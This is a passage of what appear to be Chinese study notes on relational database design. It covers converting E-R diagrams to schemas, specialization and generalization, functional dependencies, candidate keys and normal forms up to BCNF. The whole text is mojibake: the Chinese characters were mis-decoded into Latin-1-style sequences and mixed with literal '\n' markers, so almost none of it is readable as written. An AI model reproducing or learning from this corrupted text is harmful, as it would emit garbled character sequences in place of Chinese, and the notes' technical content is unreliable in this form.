å¯ä»¥å°†ä¸€ä¸ªç¬¦åˆERæ•°æ®åº“æ¨¡å¼çš„æ•°æ®åº“è¡¨ç¤ºä¸ºä¸€äº›å…³ç³»æ¨¡å¼çš„é›†åˆ\n  å…³ç³»æ¨¡å¼åå³ä¸ºç›¸åº”åœ°å®ä½“é›†æˆ–è”ç³»é›†çš„åç§°\n  æ¯ä¸ªæ¨¡å¼æœ‰å‡ åˆ—ï¼ˆç±»ä¼¼äºå±æ€§ï¼‰ï¼Œæ¯åˆ—æœ‰å”¯ä¸€çš„åå­—\n  å…·æœ‰ç®€å•å±æ€§çš„å®ä½“é›†çš„è¡¨ç¤º  ç”¨å…·æœ‰nä¸ªä¸åŒå±æ€§çš„æ¨¡å¼Eæ¥è¡¨ç¤ºå¼ºå®ä½“é›† ç”¨åŒ…å«æ ‡è¯†æ€§å¼ºå®ä½“é›†çš„ä¸»é”®ä½œä¸ºåˆ—æ„æˆçš„è¡¨æ¥è¡¨ç¤ºå®ä½“é›†   å¤šå¯¹å¤šè”ç³»é›†è¡¨ç¤ºä¸ºä¸¤ä¸ªå‚ä¸å®ä½“é›†ä¸»é”®å±æ€§å’Œè”ç³»é›†ä¸­ä»»ä½•æè¿°å±æ€§æ‰€ç»„æˆçš„æ¨¡å¼  æ¨¡å¼çš„å†—ä½™ å¤šå¯¹ä¸€å’Œä¸€å¯¹å¤šè”ç³»é›†ä¸­å…¨éƒ¨å‚ä¸çš„manyä¸€æ–¹å¯ä»¥é€šè¿‡å¢åŠ é¢å¤–çš„å±æ€§æ¥è¡¨ç¤ºï¼ŒåŒ…å«oneä¸€æ–¹çš„ä¸»é”®\n å¯¹äºä¸€å¯¹ä¸€è”ç³»é›†ï¼Œä»»æ„ä¸€è¾¹éƒ½å¯ä»¥ä½œä¸ºmanyä¸€æ–¹  é¢å¤–çš„å±æ€§å¯ä»¥åŠ åˆ°ç±»ä¼¼äºä¸¤ä¸ªå®ä½“é›†çš„ä»»ä¸€ä¸ªè¡¨ä¸­   è‹¥manyä¸€æ–¹æ˜¯éƒ¨åˆ†å‚ä¸ï¼Œåˆ©ç”¨manyä¸€æ–¹ç”Ÿæˆé¢å¤–å±æ€§ä¼šå¯¼è‡´å­˜åœ¨ç©ºå€¼ è¿æ¥å¼±å®ä½“é›†ä¸å…¶ä¾èµ–çš„å¼ºå®ä½“é›†çš„è”ç³»é›†çš„æ¨¡å¼æ˜¯å†—ä½™çš„  å¤åˆå¤šå€¼å±æ€§  å¤åˆå±æ€§å¯ä»¥åœ¨åˆ’åˆ†ä¸ºæ›´å°çš„éƒ¨åˆ†ï¼ˆå³å…¶ä»–å±æ€§ï¼‰ å®ä½“Eçš„å¤šå€¼å±æ€§Mç”¨ä¸€ä¸ªå•ç‹¬çš„å…³ç³»æ¨¡å¼EMæ ‡è¯†  å…³ç³»æ¨¡å¼EMæœ‰å’ŒEçš„ä¸»é”®ç›¸å…³çš„å±æ€§ï¼Œæœ‰ä¸€ä¸ªå’Œå¤šå€¼å±æ€§Mç›¸å…³çš„å±æ€§   å¤šå€¼å±æ€§çš„æ¯ä¸ªå€¼å’Œå…³ç³»æ¨¡å¼EMä¸­çš„æ¯ä¸ªåˆ†ç¦»çš„å…ƒç»„ç›¸åŒ¹é…  æ¨¡å¼ä¼˜åŒ–  å…³ç³»æ¨¡å¼è®¾è®¡æ–¹æ¡ˆçš„è¯„ä»·æ ‡å‡†  æ•°æ®è¡¨ç¤ºç¬¦åˆè‡ªç„¶ç»“æ„ æ¸…æ™°ã€ç®€æ´ã€æ˜“äºç†è§£ æ•°æ®å†—ä½™å° æ•°æ®è®¿é—®æ•ˆç‡é«˜ ç»“æ„æ˜“äºæ‰©å±• ã€‚ã€‚ã€‚   å…³ç³»æ¨¡å¼çš„è®¾è®¡  è®¾è®¡æ–¹æ¡ˆçš„è¯„ä»·æ ‡å‡†ä¸­ï¼ŒæŒ‡æ ‡ç›¸äº’ä¹‹é—´å­˜åœ¨çš„çŸ›ç›¾ è®¾è®¡æ˜¯åœ¨çŸ›ç›¾çš„æŒ‡æ ‡ä¸­ï¼Œè¯„ä»·é€‰æ‹©æœ€åˆé€‚çš„æ–¹æ¡ˆ å·¥ç¨‹æ€æƒ³å’Œæ–¹æ³•ã€è®¾è®¡äººå‘˜çš„ç»éªŒå’Œèƒ½åŠ›ï¼Œå¯¹æ¨¡å¼è®¾è®¡éƒ½æ˜¯é‡è¦çš„   E-Rå›¾è½¬æ¢ä¸ºè¡¨ vs æ¨¡å¼ä¼˜åŒ–è®¾è®¡  ä¸€ä¸ªè‰¯å¥½çš„ERå›¾ï¼Œè½¬æ¢ä¸ºè¡¨å¹¶è¿›è¡Œå¿…è¦çš„åˆå¹¶ï¼Œå¾—åˆ°çš„ç»“æœå·²ç»æ˜¯æ¯”è¾ƒç†æƒ³çš„æ•°æ®åº“æ¨¡å¼ ä¸æ’é™¤è¿˜æœ‰äººå·¥è¿›ä¸€æ­¥ä¼˜åŒ–çš„ä½™åœ° è¿›ä¸€æ­¥çš„ä¼˜åŒ–å¿…é¡»å®¡æ…ï¼Œå¿…é¡»ç»¼åˆè¯„ä»·ä¼˜åŒ–çš„ä¼˜ç¼ºç‚¹    è®¾è®¡é—®é¢˜ï¼šç”¨å®ä½“é›†è¿˜æ˜¯å±æ€§é›†ï¼Œç”¨å®ä½“é›†è¿˜æ˜¯è”ç³»é›†ï¼ŒäºŒå…ƒè¿˜æ˜¯nå…ƒè”ç³»é›†\næ‰©å±•çš„E-Rç‰¹æ€§   ç‰¹åŒ–  è‡ªé¡¶è€Œä¸‹è®¾è®¡è¿‡ç¨‹ï¼šå®ä½“é›†å¯èƒ½åŒ…å«ä¸€äº›å­é›†ï¼Œå­é›†ä¸­çš„å®ä½“åœ¨æŸäº›æ–¹é¢åŒºåˆ«äºå®ä½“é›†ä¸­çš„å…¶ä»–å®ä½“ è¿™äº›å­é›†å˜ä¸ºä½å±‚æ¬¡çš„å®ä½“é›†ï¼Œæ‹¥æœ‰ä¸é€‚ç”¨äºé«˜å±‚æ¬¡å®ä½“é›†çš„å±æ€§æˆ–ä¸€äº›éƒ¨åˆ†å‚ä¸çš„å…³ç³» åœ¨E-Rå›¾ä¸­ï¼Œç‰¹åŒ–ç”¨ä»ç‰¹åŒ–å®ä½“æŒ‡å‘å¦ä¸€ä¸ªå®ä½“çš„ç©ºå¿ƒç®­å¤´æ¥è¡¨ç¤ºï¼Œæˆ‘ä»¬æˆè¿™ç§å…³ç³»ä¸ºISAå…³ç³» å±æ€§ç»§æ‰¿ï¼šé«˜å±‚å®ä½“é›†çš„å±æ€§ä½ å¯ä»¥è¢«åº•å±‚å®ä½“é›†ç»§æ‰¿ã€‚åº•å±‚å®ä½“é›†ï¼ˆæˆ–å­ç±»ï¼‰åŒæ—¶è¿˜ç»§æ‰¿åœ°å‚ä¸å…¶é«˜å±‚å®ä½“ï¼ˆæˆ–è¶…ç±»ï¼‰æ‰€å‚ä¸çš„å®ä½“é›†    æ¦‚åŒ–  è‡ªåº•è€Œä¸Šçš„è®¾è®¡è¿‡ç¨‹ï¼šå¤šä¸ªå®ä½“é›†æ ¹æ®å…±åŒçš„ç‰¹å¾ç»™ä½ ç»¼åˆæˆä¸€ä¸ªè¾ƒé«˜å±‚çš„å®ä½“é›† æ¦‚åŒ–åªä¸è¿‡æ˜¯ç‰¹åŒ–çš„é€†è¿‡ç¨‹ï¼Œåœ¨ERå›¾ä¸­ï¼Œæˆ‘ä»¬å¯¹æ¦‚åŒ–å’Œç‰¹åŒ–çš„è¡¨ç¤ºä¸åšåŒºåˆ†    ç‰¹åŒ–å…³ç³»è¿˜å¯ä»¥å½¢æˆè¶…ç±»ï¼šå­ç±»è”ç³»\n  ç‰¹åŒ–/æ¦‚åŒ–ä¸Šçš„çº¦æŸ   å®ä½“å¯ä»¥æ˜¯ç»™å®šä½å±‚æ¬¡å®ä½“é›†æˆå‘˜çš„çº¦æŸ\n æ¡ä»¶å®šä¹‰çš„ ç”¨æˆ·å®šä¹‰çš„    å¦ä¸€ç±»çº¦æŸæ¶‰åŠåœ¨ä¸€ä¸ªæ¦‚åŒ–ä¸­å¦ä¸€ä¸ªå®ä½“æ˜¯å¦å¯ä»¥å±äºå¤šä¸ªä½å±‚å®ä½“é›†\n ä¸ç›¸äº¤ï¼ˆDisjointï¼‰  ä¸ç›¸äº¤çº¦æŸè¦æ±‚ä¸€ä¸ªå®ä½“è‡³å¤šå±äºä¸€ä¸ªä½å±‚å®ä½“é›† Notedï¼šåœ¨ERå›¾ä¸­ï¼Œé€šè¿‡è¿æ¥åœ¨åŒä¸€ä¸ªçŸ©å½¢ä¸Šçš„å¤šä¸ªä½å±‚æ¬¡å®ä½“é›†è¡¨ç¤º   é‡å ï¼ˆoverlappingï¼‰  åŒä¸€ä¸ªå®ä½“å¯ä»¥åŒæ—¶å±äºåŒä¸€ä¸ªæ¦‚åŒ–ä¸­çš„å¤šä¸ªä½å±‚å®ä½“é›†      å®Œæ•´æ€§çº¦æŸï¼šå®šä¹‰é«˜å±‚å®ä½“é›†ä¸­çš„å¦ä¸€ä¸ªå®ä½“æ˜¯å¦å¿…é¡»è‡³å°‘å±äºè¯¥æ¦‚åŒ–/ç‰¹åŒ–çš„ä¸€ä¸ªä½å±‚å®ä½“é›†\n å…¨éƒ¨æ¦‚åŒ–ï¼šæ¯ä¸ªé«˜å±‚å®ä½“å¿…é¡»å±äºä¸€ä¸ªä½å±‚å®ä½“é›† éƒ¨åˆ†æ¦‚åŒ–ï¼šå…è®¸ä¸€äº›é«˜å±‚å®ä½“ä¸å±äºä»»ä½•ä½å±‚å®ä½“é›†    é€šè¿‡æ¨¡å¼è¡¨ç¤ºç‰¹åŒ–ï¼š\n Method1  ä¸ºé«˜å±‚å®ä½“é›†åˆ›å»ºä¸€ä¸ªæ¨¡å¼ æ¯ä¸ªä½å±‚å®ä½“é›†åˆ›å»ºä¸€ä¸ªæ¨¡å¼ï¼Œæ¨¡å¼ä¸­çš„å±æ€§åŒ…æ‹¬å¯¹åº”ä½å±‚å®ä½“é›†çš„æ¯ä¸ªå±æ€§ï¼Œä»¥åŠå¯¹åº”äºé«˜å±‚å®ä½“é›†ä¸»ç çš„æ¯ä¸ªå±æ€§ DrawBackï¼šä¸ä½å±‚å…³ç³»æ¨¡å¼æœ‰å…³çš„å…³ç³»å’Œä¸é«˜å±‚å…³ç³»æ¨¡å¼æœ‰å…³çš„å…³ç³»   Method2  åˆ©ç”¨ä½å±‚å®ä½“é›†çš„æ¯ä¸ªå±æ€§å’Œå¯¹åº”äºé«˜å±‚å®ä½“é›†çš„æ¯ä¸ªç†Ÿæ‚‰åˆ›å»ºæ¨¡å¼ å¦‚æœç‰¹åŒ–æ˜¯å®Œå…¨çš„ï¼Œä¸éœ€è¦å­˜å‚¨æ¦‚åŒ–å®ä½“é›†çš„ä¿¡æ¯(å¯ä»¥å®šä¹‰ä¸ºåŒ…å«ç‰¹åŒ–å…³ç³»å¹¶é›†çš„viewï¼Œå¯èƒ½ä»ç„¶éœ€è¦æ˜¾ç¤ºçš„å®šä¹‰å¤–é”®çº¦æŸ) Drawbackï¼šå¯èƒ½ä¼šå­˜åœ¨å†—ä½™      æ•°æ®åº“è®¾è®¡çš„å…¶ä»–æ–¹é¢  æ•°æ®çº¦æŸ  è¯†åˆ«çº¦æŸã€æè¿°çº¦æŸã€åœ¨æ¨¡å¼å®é™…ä¸­å®ç°çº¦æŸ   æ€§èƒ½è€ƒè™‘  ååé‡ï¼Œå“åº”æ—¶é—´çš„éœ€æ±‚åˆ†æä¸ç›¸å…³è®¾è®¡è€ƒè™‘ ç´¢å¼•è®¾è®¡ï¼šç´¢å¼•å¯¹æŸ¥è¯¢å’Œæ›´æ–°æ•ˆç‡çš„å½±å“   æˆæƒ å·¥ä½œæµ  æµç¨‹åˆ†æå’Œè®¾è®¡æ˜¯åº”ç”¨ç³»ç»Ÿå¼€å‘çš„é‡è¦ç¯èŠ‚ å·¥ä½œæµç®¡ç†ç³»ç»Ÿï¼ˆWFMSï¼‰æ˜¯æµç¨‹ç®¡ç†çš„é‡è¦å¹³å° WFMSæ˜¯ä¸€ä¸ªä¸“ä¸šé¢†åŸŸï¼Œæœ¬èº«å¹¶ä¸å±äºæ•°æ®åº“é¢†åŸŸ   å…¶ä»–ï¼šè€ƒè™‘å°†æ¥å¯èƒ½çš„å˜è¿  å…³ç³»æ•°æ®åº“è®¾è®¡ å¥½çš„å…³ç³»è®¾è®¡ç‰¹ç‚¹   RDBè®¾è®¡å·¥ç¨‹æ–¹æ³•çš„ä»£è¡¨ï¼šE-Rå›¾æ–¹æ³•  ç»˜åˆ¶E-Rå›¾ E-Rå›¾ â†’ RDBæ¨¡å¼ æ¨¡å¼ä¼˜åŒ–    RDBè®¾è®¡å·¥ç¨‹æ–¹æ³•çš„é—®é¢˜  E-Rè´¨é‡å’Œåˆ†æå‘˜çš„èƒ½åŠ›æ°´å¹³ç›¸å…³ E-Rè´¨é‡éš¾ä»¥ä¿è¯ï¼Œè‡´ä½¿E-Ræ–¹æ³•è®¾è®¡è´¨é‡éš¾ä»¥ä¿è¯ å…¶ä»–RDBæ¨¡å¼å·¥ç¨‹è®¾è®¡æ–¹æ³•å­˜åœ¨ç±»ä¼¼çš„é—®é¢˜    è´¨é‡ä¿è¯  è´¨é‡ä¿è¯ vs é«˜è´¨é‡ å·¥ç¨‹æ–¹æ³•è´¨é‡ä¿è¯å›°éš¾ï¼Œå—å·¥ç¨‹äººå‘˜èƒ½åŠ›å½±å“å¤§ è´¨é‡ä¿è¯å¸¸ç”¨æ–¹æ³•ï¼šæœºæ¢°åŒ–ã€å½¢å¼åŒ–    å…³ç³»æ¨¡å¼è§„èŒƒåŒ–ç ”ç©¶èƒŒæ™¯  ä¸ºæé«˜RDBè®¾è®¡è´¨é‡ä¿è¯ï¼Œå›½å¤–å­¦è€…æ¢å¯»å’Œç ”ç©¶å½¢å¼åŒ–çš„RDBè®¾è®¡æ–¹æ³• æå‡ºå’Œå®Œå–„äº†ï¼šå…³ç³»æ¨¡å¼è§„èŒƒåŒ–ç†è®ºå’Œæ–¹æ³• å¸Œæœ›æŒ‰ç…§è§„èŒƒåŒ–ç†è®ºå’Œæ–¹æ³•ï¼Œ èƒ½å¤Ÿè¿›è¡Œæœ‰è´¨é‡ä¿è¯çš„RDBè®¾è®¡    å…³ç³»æ¨¡å¼è§„èŒƒåŒ–çš„åŸºæœ¬æ€è·¯  æ³›å…³ç³»ï¼šUniversal Relation æ•°æ®é—´çš„çº¦æŸ æŒ‰ç…§æœºæ¢°ç®—æ³•ï¼Œå¾—åˆ°å¥½çš„å…³ç³»æ¨¡å¼    å…³ç³»æ¨¡å¼è§„èŒƒåŒ–ç†è®ºå’Œæ–¹æ³•  æ¨¡å¼è§„èŒƒåŒ–æ–¹æ³•çš„ç ”ç©¶çŠ¶å†µ  æå‡ºäº†æ¨¡å¼è§„èŒƒåŒ–çš„æ ‡å‡†ï¼š1NFï¼Œ2NFï¼Œ3NFï¼ŒBCNFï¼Œ4NFï¼Œ5NFï¼Œ6NF ç»™å‡ºäº†æ³›å…³ç³»åˆ†è§£åˆ°å…·ä½“èŒƒå¼çš„ç®—æ³• ç®—æ³•å¤šä¸ºNPç®—æ³•ï¼Œæ— æ³•å®é™…æ‰§è¡Œ   è§„èŒƒåŒ–æ–¹æ³•å­¦ä¹ ä»·å€¼  ç†è§£ä¸åŒèŒƒå¼çš„ä¼˜ç¼ºç‚¹ ç†è§£ç›¸åº”çš„æ¨¡å¼æ”¹è¿›æ–¹æ³• ä½œä¸ºé‡è¦æŒ‡å¯¼æ€æƒ³æŒ‡å¯¼æ¨¡å¼è®¾è®¡    è®¾è®¡é€‰æ‹©  æ›´å°çš„æ¨¡å¼ï¼šè¿æ¥ä¸èµ·æ¥è¡¨â€”â€”æœ‰æŸåˆ†è§£ æ›´å¤§çš„æ¨¡å¼ï¼šä¿¡æ¯é‡å¤  æœ‰æŸåˆ†è§£ï¼šåˆ†è§£èŒƒå¼ä¹‹åï¼Œè‡ªç„¶è¿æ¥ä¸èƒ½é‡æ„è¡¨\næ— æŸåˆ†è§£ï¼šåˆ†è§£ä¹‹åï¼Œè‡ªç„¶è¿æ¥èƒ½é‡æ„è¡¨\n å¥½çš„å…³ç³»æ¨¡å¼  è¯¥å¤§åˆ™å¤§ï¼Œè¯¥å°åˆ™å° åŒæ•°æ®æœ¬è´¨ç»“æ„ç›¸å»åˆ ä¸å¿…å­˜å‚¨ä¸å¿…è¦çš„é‡å¤ä¿¡æ¯ï¼ŒåŒæ—¶åˆå¯ä»¥æ–¹ä¾¿åœ°è·å–ä¿¡æ¯   å¦‚ä½•å¾—åˆ°å¥½çš„å…³ç³»æ¨¡å¼  å·¥ç¨‹åŒ–æ–¹æ³• æ¨¡å¼è§„èŒƒåŒ–    åŸå­åŸŸå’Œç¬¬ä¸€èŒƒå¼   åŸå­åŸŸï¼šåŸŸå…ƒç´ è¢«è®¤ä¸ºæ˜¯ä¸å¯åˆ†çš„å•å…ƒï¼Œç§°åŸŸæ˜¯åŸå­çš„ã€‚\n  ç¬¬ä¸€èŒƒå¼ï¼šç§°ä¸€ä¸ªå…³ç³»æ¨¡å¼Rå±äºç¬¬ä¸€èŒƒå¼ï¼Œå¦‚æœRçš„æ‰€æœ‰å±æ€§åŸŸéƒ½æ˜¯åŸå­çš„ã€‚\n  éåŸå­å€¼æ˜¯çš„å­˜å‚¨å˜å¤æ‚å¹¶ä¸”å¯¼è‡´æ•°æ®å­˜è´®çš„å†—ä½™\n å†³å®šä¸€ä¸ªç‰¹å®šå…³ç³»Ræ˜¯ä¸æ˜¯ä¸€ä¸ªå¥½çš„å½¢å¼\nè‹¥ä¸€ä¸ªå…³ç³»Rä¸æ˜¯å¥½çš„å½¢å¼ï¼Œå°†ä»–åˆ†è§£ä¸ºä¸€ç³»åˆ—å…³ç³» {R1ï¼ŒR2ï¼Œ... ï¼ŒRn}ï¼Œä½¿å¾—\n æ¯ä¸ªå…³ç³»æ˜¯å½¢å¼è‰¯å¥½çš„ åˆ†è§£æ˜¯æ— æŸçš„    åŸºç¡€ç†è®ºï¼š\n å‡½æ•°ä¾èµ– å¤šå€¼ä¾èµ–   å‡½æ•°ä¾èµ– å‡½æ•°ä¾èµ–æ˜¯åœ¨åˆæ³•å…³ç³»é›†åˆä¸Šçš„çº¦æŸï¼Œè¦æ±‚ä¸€ä¸ªç‰¹å®šçš„å±æ€§é›†åˆçš„å€¼å”¯ä¸€å†³å®šå¦ä¸€ä¸ªå±æ€§é›†åˆçš„å€¼\nä¸€ä¸ªå‡½æ•°ä¾èµ–æ˜¯ä¸€ä¸ªç æ ‡è¯†çš„æ¦‚åŒ–\nè€ƒè™‘ä¸€ä¸ªå…³ç³»æ¨¡å¼Rï¼Œ Î± âˆˆ R and Î² âˆˆ R ï¼Œå‡½æ•°ä¾èµ– Î± â†’ Î² æ»¡è¶³çš„æ¡ä»¶æ˜¯å¯¹å®ä¾‹ä¸­æ‰€æœ‰å…ƒç»„å¯¹t1å’Œt2ï¼Œæœ‰ t1[Î±] = t2[Î±] âŸ¹ t1[Î²] = t2[Î²] ã€‚å¦‚æœRçš„æ¯ä¸ªåˆæ³•å®ä¾‹réƒ½æ»¡è¶³å‡½æ•°ä¾èµ– Î± â†’ Î² ï¼Œåˆ™æˆ‘ä»¬è¯´è¯¥å‡½æ•°ä¾èµ–åœ¨æ¨¡å¼Rä¸Šæˆç«‹ã€‚\n å¦‚æœå‡½æ•°ä¾èµ– K â†’ R åœ¨Rä¸Šæˆç«‹ï¼Œåˆ™Kæ˜¯Rçš„ä¸€ä¸ªè¶…ç ã€‚ Kæ˜¯Rçš„å€™é€‰ç å½“ä¸”ä»…å½“ â‘  K â†’ Rï¼›â‘¡ ä¸å­˜åœ¨ Î± âŠ‚ Kï¼ŒÎ± â†’ Rã€‚  å‡½æ•°ä¾èµ–çš„ä½¿ç”¨   åˆ©ç”¨å‡½æ•°ä¾èµ–\n åˆ¤æ–­å…³ç³»çš„å®ä¾‹æ˜¯å¦æ»¡è¶³ç»™å®šå‡½æ•°ä¾èµ–é›†F  å¦‚æœä¸€ä¸ªå…³ç³»å®ä¾‹råœ¨å‡½æ•°ä¾èµ–é›†Fä¸‹æ˜¯åˆæ³•çš„ï¼Œé‚£ä¹ˆræ»¡è¶³F   è¯´æ˜åˆæ³•å…³ç³»é›†ä¸Šçš„çº¦æŸ  å¦‚æœRä¸Šçš„æ‰€æœ‰åˆæ³•å…³ç³»éƒ½æ»¡è¶³å‡½æ•°ä¾èµ–é›†Fï¼Œé‚£ä¹ˆFåœ¨Rä¸Šæˆç«‹   Noteï¼šå³ä½¿ä¸€ä¸ªå‡½æ•°ä¾èµ–åœ¨æ‰€æœ‰å®ä¾‹ä¸Šä¸æˆç«‹ï¼Œä»–å¯èƒ½åœ¨æŸä¸ªç‰¹å®šçš„å…³ç³»æ¨¡å¼å®ä¾‹ä¸Šæˆç«‹ ä¾‹å¦‚ï¼Œinstructorä¸Šçš„ä¸€ä¸ªç‰¹å®šå®ä¾‹ï¼Œæ»¡è¶³name â†’ ID    æœ‰äº›å‡½æ•°ä¾èµ–ç§°ä¸ºå¹³å‡¡çš„ï¼Œå› ä¸ºä»–ä»¬åœ¨æ‰€æœ‰å…³ç³»ä¸­æ»¡è¶³ï¼š\n ä¸€èˆ¬çš„ï¼Œå¦‚æœ Î² âŠ† Î± ï¼ŒÎ± â†’ Î²æ˜¯å¹³å‡¡çš„    å¹³å‡¡çš„å‡½æ•°ä¾èµ–\n å¯¹æ‰€æœ‰çš„å…³ç³»æ¨¡å¼Rï¼Œå¦‚æœ Î² âŠ† Î± ï¼Œå¿…æœ‰Î± â†’ Î² å½“ Î² âŠ† Î± æ—¶ï¼Œç§° Î± â†’ Î² æ˜¯å¹³å‡¡ï¼ˆtrivialï¼‰çš„å‡½æ•°ä¾èµ– å¦åˆ™ï¼Œç§°ä¸º Î± â†’ Î² éå¹³å‡¡çš„å‡½æ•°ä¾èµ–ï¼Œç§° Î± æ˜¯ Î² çš„å®è´¨å†³å®šå› ç´      å¯¹ç«‹å…³ç³»æ¨¡å¼R(sno, sname, dno, dname)ï¼Œä¸‹è¿°å‡½æ•°ä¾èµ–æˆç«‹ï¼š\n sno â†’ snameï¼Œdnoï¼Œdname snoï¼Œsname â†’ dno dno â†’ dname   å‡½æ•°ä¾èµ–æ˜¯å¯¹å…³ç³»æ¨¡å¼çš„çº¦æŸ\n å…³ç³»æ¨¡å¼çš„è¡¨ç¤ºï¼šå››å…ƒç»„ Rï¼ˆUï¼ŒDï¼Œdomï¼ŒFï¼‰ï¼ŒFæ˜¯Ræˆç«‹çš„å‡½æ•°ä¾èµ–é›†åˆ å…³ç³»æ¨¡å¼ç®€å•è¡¨ç¤ºä¸ºï¼šR(F)  ä¸æˆç«‹çš„å‡½æ•°ä¾èµ–  å¯¹å…³ç³»æ¨¡å¼R(sno, sname, dno, dname)ï¼Œä¸‹è¿°å‡½æ•°ä¾èµ–ä¸æˆç«‹ï¼šsname â†’ sno  å‡½æ•°ä¾èµ–æ˜¯å¯¹æ¨¡å¼çš„çº¦æŸ å‡½æ•°ä¾èµ–å¿…é¡»æ˜¯ç°å®è¯­ä¹‰çº¦æŸçš„åæ˜  åœ¨ä¸€äº›å…·ä½“çš„å…³ç³»å®ä¾‹ä¸Šï¼Œsname â†’ snoæˆç«‹    å‡½æ•°ä¾èµ–ä¸ç   ä½¿ç”¨å‡½æ•°ä¾èµ–ç   è¶…ç SuperKeyï¼šå¯¹å…³ç³»æ¨¡å¼Rï¼Œ Î± âŠ† Rï¼Œå¦‚æœ Î± â†’ Rï¼Œåˆ™Î±ä¸ºè¶…ç  å€™é€‰ç CandidateKeyï¼šå¯¹å…³ç³»æ¨¡å¼Rï¼ŒÎ±ä¸ºè¶…ç ï¼Œå¦‚æœä»»æ„Î±çš„çœŸå­é›†Î²ï¼ŒÎ² â†’ R ä¸æˆç«‹ï¼Œåˆ™ç§°Î± ä¸ºå€™é€‰ç      ä¾‹ï¼šå¯¹å…³ç³»æ¨¡å¼R(sno,sname,dno,dname)ï¼Œä¸‹è¿°å‡½æ•°ä¾èµ–æˆç«‹ï¼šâ‘ snoâ†’Râ‘¡sno,dnoâ†’R\n  å®ä¾‹æ»¡è¶³çš„ä¾èµ– vs æ¨¡å¼ä¸Šæˆç«‹çš„ä¾èµ–  å…³ç³»æ¨¡å¼R(F)ï¼Œå¦‚æœ r âˆˆ R(F)ï¼Œåˆ™  Rä¸Šæˆç«‹çš„æ‰€æœ‰å‡½æ•°ä¾èµ–ï¼Œrå¿…é¡»æ»¡è¶³ï¼›å¦åˆ™ï¼Œç§°r âˆ‰ R(F) rä¸Šæ»¡è¶³çš„å‡½æ•°ä¾èµ–ï¼ŒRä¸Šä¸ä¸€å®šæˆç«‹      å‡½æ•°ä¾èµ–é›†åˆçš„é—­åŒ… ç»™å®šå‡½æ•°ä¾èµ–é›†Fï¼Œå¿…å®šæœ‰ä¸€äº›å…¶ä»–çš„å‡½æ•°ä¾èµ–è¢«Fé€»è¾‘è•´å«ï¼Œä¾‹å¦‚ï¼šå¦‚æœAâ†’Bä¸”Bâ†’Cï¼Œé‚£ä¹ˆå¯æ¨æ–­Aâ†’C\nèƒ½å¤Ÿä»ç»™å®šFé›†åˆæ¨å¯¼å‡ºçš„æ‰€æœ‰å‡½æ•°ä¾èµ–çš„é›†åˆç§°ä¸ºFçš„é—­åŒ…\nä½¿ç”¨F+ ç¬¦å·æ¥è¡¨ç¤ºFé›†åˆçš„é—­åŒ…\nF+æ˜¯Fçš„ä¸€ä¸ªè¶…é›†\nBoyce-Codd èŒƒå¼ å…·æœ‰å‡½æ•°ä¾èµ–é›†Fçš„å…³ç³»æ¨¡å¼Rå±äºBCNFçš„æ¡ä»¶æ˜¯ï¼Œå¯¹F+ä¸­æ‰€æœ‰å½¢å¦‚ Î± â†’ Î² çš„å‡½æ•°ä¾èµ–ï¼Œä¸‹é¢è‡³å°‘æœ‰ä¸€é¡¹æˆç«‹ï¼š\n Î± â†’ Î² æ˜¯å¹³å‡¡çš„å‡½æ•°ä¾èµ–ï¼ˆå³ Î² âŠ† Î±ï¼‰ Î± æ˜¯æ¨¡å¼Rçš„ä¸€ä¸ªè¶…ç    1NFæ˜¯æŒ‡æ•°æ®åº“è¡¨çš„æ¯ä¸€åˆ—éƒ½æ˜¯ä¸å¯åˆ†å‰²çš„åŸºæœ¬æ•°æ®é¡¹ï¼Œå³å®ä½“ä¸­çš„æŸä¸ªå±æ€§ä¸èƒ½æœ‰å¤šä¸ªå€¼æˆ–è€…ä¸èƒ½æœ‰é‡å¤çš„å±æ€§ã€‚\n2NFè¦æ±‚å±æ€§å®Œå…¨ä¾èµ–äºä¸»é”®ï¼Œä¸èƒ½å­˜åœ¨ä»…ä¾èµ–ä¸»å…³é”®å­—ä¸€éƒ¨åˆ†çš„å±æ€§ã€‚\n3NFè¦æ±‚æ¯ä¸€ä¸ªéä¸»å±æ€§æ—¢ä¸éƒ¨åˆ†ä¾èµ–äºç ä¹Ÿä¸ä¼ é€’ä¾èµ–äºç ã€‚\nBCNFæ¶ˆé™¤äº†ä¸»å±æ€§å¯¹å€™é€‰ç çš„éƒ¨åˆ†å’Œä¼ é€’å‡½æ•°ä¾èµ–ã€‚\n1ã€ç¬¬ä¸€èŒƒå¼ï¼ˆ1NFï¼‰ï¼šä¸€ä¸ªå…³ç³»æ¨¡å¼Rçš„æ‰€æœ‰å±æ€§éƒ½æ˜¯ä¸å¯åˆ†çš„åŸºæœ¬æ•°æ®é¡¹ï¼ŒåŸå­çš„ã€‚\n2ã€ç¬¬äºŒèŒƒå¼ï¼ˆ2NFï¼‰ï¼šæ»¡è¶³ç¬¬ä¸€èŒƒå¼ï¼Œç„¶åæ¶ˆé™¤éƒ¨åˆ†ä¾èµ–ã€‚\n3ã€ç¬¬ä¸‰èŒƒå¼ï¼ˆ3NFï¼‰ï¼š æ»¡è¶³ç¬¬äºŒèŒƒå¼ï¼Œæ¶ˆé™¤ä¼ é€’ä¾èµ–ã€‚\n BCNFçš„æœ¬è´¨  ï¼ˆåœ¨åªè€ƒè™‘å‡½æ•°ä¾èµ–çš„å‰æä¸Šï¼‰åªè®²ä¸€ä»¶äº‹ éç å†³å®šçš„é‚£ä¸ªå› ç´ çš„ç›¸å…³å†³å®šå…³ç³»è®²è¿°äº†å¦å¤–ä¸€ä»¶äº‹ å¤šä¸ªç æ˜¯ä¸€ä»¶äº‹çš„ä¸åŒæ–¹é¢ï¼Œæœ¬è´¨ä¸Šä»æ˜¯ä¸€ä»¶äº‹  æ‰€æœ‰çš„äºŒå…ƒè”ç³»éƒ½æ˜¯BCNF\nBCNFå’Œä¿æŒä¾èµ–ï¼šå…³ç³»æ¨¡å¼å¯ä»¥é€šè¿‡åˆ†è§£è¾¾åˆ°BCNF\nDBMSæ£€æŸ¥å‡½æ•°ä¾èµ–çš„å¼€é”€å¾ˆå¤§\nå°†æ•°æ®åº“è®¾è®¡æˆèƒ½å¤Ÿé«˜æ•ˆçš„æ£€æŸ¥çº¦æŸæ˜¯å¾ˆæœ‰ç”¨çš„ï¼Œå¦‚æœå‡½æ•°ä¾èµ–çš„æ£€éªŒä»…éœ€è¦è€ƒè™‘ä¸€ä¸ªå…³ç³»å°±å¯ä»¥å®Œæˆï¼Œé‚£ä¹ˆæ£€æŸ¥è¿™ç§çº¦æŸçš„å¼€é”€å°±å¾ˆä½\nBCNFçš„è®¾è®¡ä¸æ˜¯ä¿æŒä¾èµ–çš„ï¼Œç”±äºå¸¸å¸¸å¸Œæœ›ä¿æŒä¾èµ–ï¼Œå› 